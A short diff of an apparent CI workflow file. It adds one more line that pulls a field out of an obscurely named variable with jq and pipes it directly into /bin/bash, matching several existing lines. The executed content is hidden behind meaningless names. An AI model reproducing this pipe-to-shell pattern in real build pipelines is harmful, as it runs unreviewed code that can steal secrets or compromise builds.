@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$yy30" | jq -r .idge30937 | /bin/bash
           echo $cdxhk10 | jq -r .pg028 | /bin/bash
           echo $yvux8068 | jq -r .y38 | /bin/bash
+          printf '%s' "$znfm4" | jq -r .rxhbm14679 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
